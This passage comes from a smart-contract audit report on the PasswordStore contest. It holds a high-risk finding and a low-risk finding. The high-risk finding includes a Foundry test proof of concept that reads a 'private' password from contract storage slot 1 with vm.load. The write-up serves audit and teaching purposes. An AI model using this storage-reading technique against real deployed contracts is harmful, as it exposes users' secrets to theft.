[SargeSMITH](/profile/clk58rin50000mk0847s4gjvo), [ugrru](/profile/clnub5s6w000kmr08q6rgbu4u), [dcheng](/profile/clnw5u1te0006l708th66izul), [dougo](/profile/clnvz1v7u0000mg07ikf4cqcd), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [aviksaikat](/profile/clkpe1roy000wmm08xhyes74k), [notvalidaccount](/profile/clnv49bjf0002l308q23jpmzx), [rufflabs](/profile/clnw0093y000oms08reihmvs5), [CryptoThemeX](/profile/cllkrohv40020l308abiebtb3), [zuhaibmohd](/profile/clk9l0cjq000iih08gux5zwob), [0xSimeon](/profile/clk4oou2i0000l808pkf7krr7), [etherhood](/profile/clkgulfrb0002jq08t4mwxpvy), [ThermoHash](/profile/clk89rwlt0000mr09jtlo75v6), [0xPinto](/profile/clk7308tp0022l508nclvqhqn), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [SecurityDev23](/profile/clk46s8m10022la08qgfsxkfu), [0xsandy](/profile/clk43kus5009imb0830ko7dxy), [Nobita](/profile/clo0we9sg0000l508n64qt0nf), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [0xfuluz](/profile/clnzti7fb0006mf084zv1nm96), [0xspryon](/profile/clo19fw280000mf08c4yazene), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [PTolev](/profile/clk3wuu9e000kmf08tbdth8ir), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [Equious](/profile/clldzdkk60000mr082grbuj97), [MikeDougherty](/profile/clnuc4zbb000cl508b6gnobqi), [836541](/profile/clmjmucu80008l408y33vhxfq), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [KURO](/profile/cln6wuqc6000ol808dd8imjox), [crypt0mate](/profile/clk82i8pg0000jo08jat0qepq), [2pats](/profile/clo2cd6np000dl2091dqd135p), [Topmark](/profile/clk8dnw610000mm085mho9uwp), [0xnhattranduy](/profile/clnv9e9q40000kz08zlxyutpw), [ke1caM](/profile/clk46fjfm0014la08xl7mwtis), [Skalv](/profile/clme10uze0000la09jxfemuv2), [cats](/profile/clkpcyd8s0000mm08gto4lwp7), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [danlipert](/profile/clnykqixa0000mf08qa9u8qoz), [zen4269](/profile/clnuh6eoq0012l408590tbzrz), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [DappDojo](/profile/clnyx0enk0006l10805ktik8g), [lionel](/profile/clk3ucvno0000m908ueni2yhd), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [gunboats](/profile/clo32buy80000l908o8rte1wk), [Phantomsands](/profile/clmzkqz160000l208a61xhvi5), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [n4thedev01](/profile/clnybjmgf0001l708j472drqp), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [Kodak](/profile/clkbnsqx40008lc08n0y0kd20), [thetechnofeak](/profile/clk9dpjvm000cmm08ae2qelw4), [ihtishamsudo](/profile/clk45qe6f0004la08qheax87s), [0xMUSA1337](/profile/clnxkvihy000ijq08teh393g3), [luiscfaria](/profile/clm5kij1w0000l408b5x7s42q), [trauki](/profile/cllq1dzsq0000mh08q4ygxk1t), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [0xgd](/profile/clo3l6cr5000cky08f01v4242), [devival](/profile/clk87smah000kl708ybyqinyl), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [m1nd0v3rfl0w](/profile/clk484xtk0046l508lncw2zo7), [boredpukar](/profile/clkarpfyo000cl90845grept2), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [prorocketh](/profile/clo2kz3qt000cmf08647nwz0f), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [Heba](/profile/clo3cb5nv000mmj087plzmqy8), [bronzepickaxe](/profile/clk85kzum0008l9086dj0suek), [klaus](/profile/clkwlspwi002sk008f6i0bjvu), [dadev](/profile/clo3aywnt000cmp084y4he5br), [Prabhas](/profile/clo469tki000vmk084z9qbdc1), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [philfr](/profile/cln48o0rf0000mn08fc6i734d), [codyx](/profile/clo15yq5l0000ml08qecr06jr), [MufDSol](/profile/clo4aw58i0000jt08qznuwjjq), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [theirrationalone](/profile/clk46mun70016l5082te0md5t), [0x8e88](/profile/clo3qy6fe0000mf08gcv5b2zl), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [Random](/profile/clmarm50b0002md08d3iycbx4), [sm4rty](/profile/clk4170ln003amb088n137st7), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [0xKriLuv](/profile/clo4gftul0016jv08pfpi5md6), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [bytes1](/profile/clltjyli6000wlf08wia9q2nx), [Avi17](/profile/clk3tjq1r0012ib0871kwj2tw), [zadev](/profile/clo4l66aa0000md08lazlawbn), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [TorpedopistolIxc41](/profile/clk5ki3ah0000jq08yaeho8g7), [0xaman](/profile/cln8ldajr0000jy085cig6cz4), [likkee](/profile/clnxfy6qu0000mv08c0bwyhvr), [Ekiio](/profile/clnvgtp870006l108d20nqnib), [asuiTouthang](/profile/clk9bd0tr0000mi084i1py0rx), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [cRat1st0s](/profile/clk40jnqb003ela082lym3lj7), [tutkata](/profile/cllj4oszn0000lc08gehftn5s), [Damilare](/profile/clo459tih000imk08i8q3oy47), [TumeloCrypto](/profile/clo14gtlr0000mi08ylfhaqww), [0xdraiakoo](/profile/clk3xadrc0020l808t9unuqkr), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [Kelvineth](/profile/clkaa82lg0000l308jv5dbr1o), [rocket](/profile/clo4us02w000ci908zogzemab), [0xraion](/profile/cll8ga6ix0000l208u3eu4zfc), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [Omeguhh](/profile/clkvbx923003kl008u2lvm36y), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [0x0bservor](/profile/clk84a1vx0028m908i1rsjdgq), [0xnevi](/profile/clk3twjk3003imj08kmy05ubk), [innertia](/profile/clkqyrmqu000gkz08274w833n), [ivaniuss](/profile/clnum7noq0009l708lbm1za0u), [timo](/profile/clkgvyedg001cjq08pyqnjlnf), [TheCodingCanuck](/profile/clkg5xveq0000i9082f9kiksa), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [whiteh4t9527](/profile/clo5gva7c000qju08mwizp15i), [usmanfarooq90](/profile/clk47y2ey0038la088eca1es3), [0xdangit](/profile/clnui7kb50000mi080ap2y4t5), [patrooney](/profile/clk42qdto008ula08u8m9z7jc), [0x11singh99](/profile/clkhsr7bn0000l608c9vc7ugr), [dianivanov](/profile/clo3cuadr0017mp08rvq00v4e), [Oozman](/profile/clnu31wgx0000jy08f68hn16l), [azanux](/profile/clk45q9ry0000l5080kf923kw), [Louis](/profile/clloixi3x0000la08i46r5hc8), [bob](/profile/clnxon1440000me081vpylqze), [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh), [toddteller](/profile/clo2z1sol0000mn08kyo1dzud), [bhvrvt](/profile/clnu2w6ka000lmf086jwlnbf4), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [0xYudhishthra](/profile/clo4kiovm0016la08glwxmr08), [radeveth](/profile/clk406c5j0008jl08i3ojs45y). Selected submission by: [bhvrvt](/profile/clnu2w6ka000lmf086jwlnbf4)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L14

## Summary

The protocol is using a `private` state variable to store the owner's password under the assumption that being a "private" variable its value is a secret from everyone else except the owner; which is a completely false assumption.

In Solidity, marking a variable as `private` doesn't mean that the data stored in that variable is entirely secret or private from all observers of the blockchain. While it restricts direct external access to the variable from other contracts, it's essential to understand that the data on the blockchain is inherently transparent and can be viewed by anyone. Other smart contracts and blockchain explorers can still access and read the data if they know where to look. 

'Private' in Solidity primarily provides encapsulation and access control within the contract itself, rather than offering complete data privacy on the public blockchain.

## Vulnerability Details

```solidity
string private s_password;
```

Aforementioned is the `s_password` variable which is being assumed as a secret by the protocol for it being a `private` variable. This is a completely false assumption since all data on the blockchain is public.

## Proof of Concept

### Actors:
- **Attacker**: Any non-owner malicious actor on the network. 
- **Victim**: Owner of the PasswordStore protocol.
- **Protocol**: PasswordStore is meant to allow only the owner to store and retrieve their password securely.


### Working Test Case:   
(**Note :** Though the following code fetches the Victim's password correctly in ASCII format; with my current skills in Solidity I've been struggling to make the `assertEq()` function return `true` when comparing the two strings. The problem seems to be with how the result of `abi.encodePacked()` for `anyoneCanReadPassword` variable fetched from `vm.load` has a bunch of trailing zeroes in it while the same for `victimPassword` doesn't.

Therefore my current POC proves the exploit by using `console.log` instead of `assertEq`
)   
  
Write and run the following test case in the `PasswordStore.t.sol` test file.

```solidity
function test_any_non_owner_can_see_password() public {
    string memory victimPassword = "mySecretPassword"; // Defines Victim's (Owner's) password
    vm.startPrank(owner); // Simulates Victim's address for the next call
    passwordStore.setPassword(victimPassword); // Victim sets their password

    // At this point, Victim thinks their password is now "privately" stored on the protocol and is completely secret.
    // The exploit code that now follows can be performed by just about everyone on the blockchain who are aware of the Victim's protocol and can access and read the Victim's password.

    /////////// EXPLOIT CODE performed by Attacker ///////////

    // By observing the protocol's source code at `PasswordStore.sol`, we notice that `s_password` is the second storage variable declared in the contract. Since storage slots are alloted in the order of declaration in the EVM, its slot value will be '1'
    uint256 S_PASSWORD_STORAGE_SLOT_VALUE = 1;

    // Access the protocol's storage data at slot 1
    bytes32 slotData = vm.load(
        address(passwordStore),
        bytes32(S_PASSWORD_STORAGE_SLOT_VALUE)
    );

    // Converting `bytes` data to `string`
    string memory anyoneCanReadPassword = string(
        abi.encodePacked(slotData)
    );
    // Exposes Victim's password on console
    console.log(anyoneCanReadPassword);
}

```

Make sure to run the test command with `-vv` flag to see the `Logs` in command output.    


## Impact
This vulnerability completely compromises the confidentiality of the protocol and exposes the sensitive private data of the owner of the protocol to everyone on the blockchain.

## Tools Used
Foundry

## Recommendations

All data on the blockchain is public. To store sensitive information, additional encryption or off-chain solutions should be considered. Sensitive and personal data should never be stored on the blockchain in plaintext or weakly encrypted or encoded format. 

# Medium Risk Findings



# Low Risk Findings

## <a id='L-01'></a>L-01. Initialization Timeframe Vulnerability

_Submitted by [dianivanov](/profile/clo3cuadr0017mp08rvq00v4e)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-PasswordStore/blob/main/src/PasswordStore.sol

## Summary
The PasswordStore contract exhibits an initialization timeframe vulnerability. This means that there is a period between contract deployment and the explicit call to setPassword during which the password remains in its default state. It's essential to note that even after addressing this issue, the password's public visibility on the blockchain cannot be entirely mitigated, as blockchain data is inherently public as already stated in the "Storing password in blockchain" vulnerability.

## Vulnerability Details
The contract does not set the password during its construction (in the constructor). As a result, when the contract is initially deployed, the password remains uninitialized, taking on the default value for a string, which is an empty string.

During this initialization timeframe, the contract's password is effectively empty and can be considered a security gap.

## Impact
The impact of this vulnerability is that during the initialization timeframe, the contract's password is left empty, potentially exposing the contract to unauthorized access or unintended behavior. 

## Tools Used
No tools used. It was discovered through manual inspection of the contract.

## Recommendations
To mitigate the initialization timeframe vulnerability, consider setting a password value during the contract's deployment (in the constructor). This initial value can be passed in the constructor parameters.




